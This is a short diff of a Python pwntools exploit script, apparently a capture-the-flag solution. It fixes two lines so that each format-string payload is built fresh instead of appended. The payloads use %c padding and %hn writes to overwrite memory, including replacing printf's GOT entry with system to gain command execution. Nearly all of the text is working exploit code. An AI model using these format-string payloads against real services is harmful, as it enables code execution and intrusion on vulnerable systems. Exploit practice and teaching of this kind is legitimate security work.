@@ -113,7 +113,7 @@ main_high = (main >> 16) & 0xffff
 
 
 p.recvuntil(b"\n\n")
-payload += f'%{main_high}c'.encode()
+payload = f'%{main_high}c'.encode()
 payload += b'%10$hn'
 payload += f'%{main_low - main_high}c'.encode()
 payload += b'%11$hn'
@@ -166,7 +166,7 @@ log.info('[3] input : printf@got -> system')
 
 
 p.recvuntil(b"\n\n")
-payload += f'%{low}c'.encode()
+payload = f'%{low}c'.encode()
 payload += b'%11$hn'
 payload += f'%{middle}c'.encode()
 payload += b'%12$hn'
